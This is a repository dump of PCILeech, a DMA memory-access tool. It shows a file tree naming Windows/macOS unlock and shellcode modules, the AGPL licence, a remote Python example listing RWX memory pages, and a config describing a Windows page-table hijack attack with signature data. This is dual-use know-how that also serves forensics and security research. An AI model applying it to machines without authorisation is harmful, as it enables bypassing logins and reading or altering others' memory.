Project Path: arc_gmh5225_pcileech_7xucexcl

Source Tree:

```txt
arc_gmh5225_pcileech_7xucexcl
├── LICENSE
├── files
│   ├── agent-find-rwx.py
│   ├── fbsdx64_filepull.ksh
│   ├── lx64_filedelete.ksh
│   ├── lx64_filepull.ksh
│   ├── lx64_filepush.ksh
│   ├── macos_filepull.ksh
│   ├── macos_filepush.ksh
│   ├── macos_unlock.ksh
│   ├── pcileech.txt
│   ├── pcileech_gensig.cfg
│   ├── signature_info.txt
│   ├── stickykeys_cmd_win.sig
│   ├── uefi_textout.ksh
│   ├── uefi_winload_ntos_patch.ksh
│   ├── unlock_macos.sig
│   ├── unlock_win10x64.sig
│   ├── unlock_win8x64.sig
│   ├── unlock_winvistax64.sig
│   ├── win7x64.kmd
│   ├── winvistax64.kmd
│   ├── wx64_driverinfo.ksh
│   ├── wx64_driverload_svc.ksh
│   ├── wx64_driverunload.ksh
│   ├── wx64_filepull.ksh
│   ├── wx64_filepush.ksh
│   ├── wx64_pageinfo.ksh
│   ├── wx64_pagesignature.ksh
│   ├── wx64_psblue.ksh
│   ├── wx64_pscmd.ksh
│   ├── wx64_pscmd_user.ksh
│   ├── wx64_pscreate.ksh
│   ├── wx64_pskill.ksh
│   ├── wx64_pslist.ksh
│   └── wx64_unlock.ksh
├── includes
│   ├── dokan.h
│   ├── fileinfo.h
│   ├── leechcore.h
│   ├── lib32
│   │   ├── leechcore.lib
│   │   └── vmm.lib
│   ├── lib64
│   │   ├── leechcore.lib
│   │   └── vmm.lib
│   ├── public.h
│   └── vmmdll.h
├── pcileech
│   ├── Makefile
│   ├── charutil.c
│   ├── charutil.h
│   ├── device.c
│   ├── device.h
│   ├── executor.c
│   ├── executor.h
│   ├── extra.c
│   ├── extra.h
│   ├── help.c
│   ├── help.h
│   ├── kmd.c
│   ├── kmd.h
│   ├── memdump.c
│   ├── memdump.h
│   ├── mempatch.c
│   ├── mempatch.h
│   ├── ob
│   │   ├── ob.h
│   │   ├── ob_cachemap.c
│   │   ├── ob_core.c
│   │   ├── ob_map.c
│   │   └── ob_set.c
│   ├── oscompatibility.c
│   ├── oscompatibility.h
│   ├── pcileech.c
│   ├── pcileech.h
│   ├── pcileech.rc
│   ├── pcileech.vcxproj
│   ├── pcileech.vcxproj.filters
│   ├── pcileech.vcxproj.user
│   ├── shellcode.h
│   ├── statistics.c
│   ├── statistics.h
│   ├── umd.c
│   ├── umd.h
│   ├── util.c
│   ├── util.h
│   ├── version.h
│   ├── vfs.c
│   ├── vfs.h
│   ├── vfslist.c
│   ├── vfslist.h
│   ├── vmmx.c
│   └── vmmx.h
├── pcileech.sln
├── pcileech_shellcode
│   ├── fbsdx64_common.c
│   ├── fbsdx64_common.h
│   ├── fbsdx64_common_a.asm
│   ├── fbsdx64_filepull.c
│   ├── fbsdx64_stage2.asm
│   ├── fbsdx64_stage3.asm
│   ├── fbsdx64_stage3_c.c
│   ├── info_kmd_core.txt
│   ├── lx64_common.c
│   ├── lx64_common.h
│   ├── lx64_common_a.asm
│   ├── lx64_filedelete.c
│   ├── lx64_filepull.c
│   ├── lx64_filepush.c
│   ├── lx64_stage2.asm
│   ├── lx64_stage2_efi.asm
│   ├── lx64_stage3.asm
│   ├── lx64_stage3_c.c
│   ├── lx64_stage3_pre.asm
│   ├── lx64_vfs.c
│   ├── macos_common.c
│   ├── macos_common.h
│   ├── macos_common_a.asm
│   ├── macos_filedelete.c
│   ├── macos_filepull.c
│   ├── macos_filepush.c
│   ├── macos_stage2.asm
│   ├── macos_stage3.asm
│   ├── macos_stage3_c.c
│   ├── macos_unlock.c
│   ├── macos_vfs.c
│   ├── pcileech_shellcode.vcxproj
│   ├── pcileech_shellcode.vcxproj.filters
│   ├── pcileech_shellcode.vcxproj.user
│   ├── statuscodes.h
│   ├── uefi_common.c
│   ├── uefi_common.h
│   ├── uefi_common_a.asm
│   ├── uefi_kmd.asm
│   ├── uefi_kmd_c.c
│   ├── uefi_textout.c
│   ├── uefi_winload_ntos_kmd.asm
│   ├── uefi_winload_ntos_kmd_c.c
│   ├── uefi_winload_ntos_patch.c
│   ├── wx64_common.c
│   ├── wx64_common.h
│   ├── wx64_common_a.asm
│   ├── wx64_driverinfo.c
│   ├── wx64_driverload_svc.c
│   ├── wx64_driverunload.c
│   ├── wx64_exec_user.asm
│   ├── wx64_exec_user_c.c
│   ├── wx64_filepull.c
│   ├── wx64_filepush.c
│   ├── wx64_pageinfo.asm
│   ├── wx64_pagesignature.c
│   ├── wx64_psblue.asm
│   ├── wx64_pscreate.c
│   ├── wx64_pskill.c
│   ├── wx64_pslist.c
│   ├── wx64_stage1.asm
│   ├── wx64_stage2.asm
│   ├── wx64_stage23_vmm.asm
│   ├── wx64_stage23_vmm3.asm
│   ├── wx64_stage2_hal.asm
│   ├── wx64_stage3.asm
│   ├── wx64_stage3_c.c
│   ├── wx64_stage3_pre.asm
│   ├── wx64_umd_exec.asm
│   ├── wx64_umd_exec_c.c
│   ├── wx64_unlock.c
│   └── wx64_vfs.c
├── readme.md
├── usb3380.md
└── usb3380_flash
    ├── linux
    │   ├── Makefile
    │   ├── pcileech_flash.c
    │   ├── readme.md
    │   └── readme_flash.txt
    └── windows
        ├── USB3380Flash
        │   ├── USB3380Flash.c
        │   ├── USB3380Flash.h
        │   ├── USB3380Flash.inf
        │   ├── USB3380Flash.user
        │   ├── USB3380Flash.vcxproj
        │   ├── USB3380Flash.vcxproj.filters
        │   └── USB3380Flash.vcxproj.user
        └── USB3380Flash_Installer
            ├── USB3380Flash_Installer.vcxproj
            ├── USB3380Flash_Installer.vcxproj.filters
            ├── USB3380Flash_Installer.vcxproj.user
            └── installer.c

```

`LICENSE`:

```
                    GNU AFFERO GENERAL PUBLIC LICENSE
                       Version 3, 19 November 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU Affero General Public License is a free, copyleft license for
software and other kinds of works, specifically designed to ensure
cooperation with the community in the case of network server software.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
our General Public Licenses are intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  Developers that use our General Public Licenses protect your rights
with two steps: (1) assert copyright on the software, and (2) offer
you this License which gives you legal permission to copy, distribute
and/or modify the software.

  A secondary benefit of defending all users' freedom is that
improvements made in alternate versions of the program, if they
receive widespread use, become available for other developers to
incorporate.  Many developers of free software are heartened and
encouraged by the resulting cooperation.  However, in the case of
software used on network servers, this result may fail to come about.
The GNU General Public License permits making a modified version and
letting the public access it on a server without ever releasing its
source code to the public.

  The GNU Affero General Public License is designed specifically to
ensure that, in such cases, the modified source code becomes available
to the community.  It requires the operator of a network server to
provide the source code of the modified version running there to the
users of that server.  Therefore, public use of a modified version, on
a publicly accessible server, gives the public access to the source
code of the modified version.

  An older license, called the Affero General Public License and
published by Affero, was designed to accomplish similar goals.  This is
a different license, not a version of the Affero GPL, but Affero has
released a new version of the Affero GPL which permits relicensing under
this license.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU Affero General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Remote Network Interaction; Use with the GNU General Public License.

  Notwithstanding any other provision of this License, if you modify the
Program, your modified version must prominently offer all users
interacting with it remotely through a computer network (if your version
supports such interaction) an opportunity to receive the Corresponding
Source of your version by providing access to the Corresponding Source
from a network server at no charge, through some standard or customary
means of facilitating copying of software.  This Corresponding Source
shall include the Corresponding Source for any work covered by version 3
of the GNU General Public License that is incorporated pursuant to the
following paragraph.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the work with which it is combined will remain governed by version
3 of the GNU General Public License.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU Affero General Public License from time to time.  Such new versions
will be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU Affero General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU Affero General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU Affero General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If your software can interact with users remotely through a computer
network, you should also make sure that it provides a way for users to
get its source.  For example, if your program is a web application, its
interface could display a "Source" link that leads users to an archive
of the code.  There are many ways you could offer source, and different
solutions will be better for different programs; see section 13 for the
specific requirements.

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU AGPL, see
<https://www.gnu.org/licenses/>.

```

`files/agent-find-rwx.py`:

```py
# Example file to demonstrate remote python functionality with the LeechAgent.
#
# Example:
# pcileech.exe -device <device> -remote rpc://<spn or insecure>:host agent-execpy -in agent-find-rwx.py
#
# The python script will be executed in a child process to the LeechAgent in
# the user-context of the LeechAgent. If the agent is running as a service this
# is most likely SYSTEM. It's also possible to use this functionality to run
# Python scripts on the remote host without using the memory analysis functionality.
#
# Please check out agent installation instructions at:
# https://github.com/ufrisk/LeechCore/wiki/LeechAgent
# https://github.com/ufrisk/LeechCore/wiki/LeechAgent_Install
#


#
# Example to load LeechCore for Python connecting to the memory acqusition device
# specified in the PCILeech -device parameter. Please uncomment to activate.
# Guide at: https://github.com/ufrisk/LeechCore/wiki/LeechCore_API_Python
#
'''
import leechcorepyc
lc = leechcorepyc.LeechCore('existing')
print(lc)
'''


#
# Example to load MemProcFS for Python connecting to the memory acqusition device
# specified in the PCILeech -device parameter.
# For information about MemProcFS Python API please check out the wiki for API
# usage examples and a youtube demo.
# https://github.com/ufrisk/MemProcFS/wiki/API_Python
# 
#
import memprocfs
vmm = memprocfs.Vmm()
for process in vmm.process_list():
    for entry in process.maps.pte():
        if '-rwx' in entry['flags']:
            print(str(process.pid) + ': ' + process.name + ': ' + str(entry))

```

`files/pcileech.txt`:

```txt
Download the latest binaries from https://github.com/ufrisk/pcileech/releases/latest
```

`files/pcileech_gensig.cfg`:

```cfg
# Configuration data for the Windows 8.1/10/2012R2/2016 pagetable hijack signature generator.
# The signatures for the page table hijack attack requires (8192) two full pages of binary code
# from Microsoft binaries we hash the required pages and ask the users of PCILeech to extract
# the required code in order to avoid distributing potentially copyrighted Microsoft binary code.
#
# Each line represents a signature and populates a c-struct entry as per below:
#
#	{
#		.szSignatureInfoDisplay = "ntfs.sys signed on 2014-10-15 (Windows 8.1 x64)",
#		.szFileName = "win8x64_ntfs_20141015.kmd",
#		.szSignatureInfo = "# ntfs.sys signed on 2014-10-15 (MJ_CREATE)",
#		.dwOffset1 = 0xd3000,
#		.dwOffset2 = 0x4a000,
#		.szHash1 = "1ac5c0df47e153480fc49bb3687df84473168bd65b4bb58ab3885f47a6116d1b",
#		.szHash2 = "a65cf907fb5aecb5d2a256b8a49706469025c740a896e3a8d0b27537f6fbbc6f",
#		.szSignatureData = ",d3920,DEFAULT_WINX64_STAGE1,4ad80,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804a000100210001800a0003800c00018054010100080000001b00018001000000"
#	},
#
#
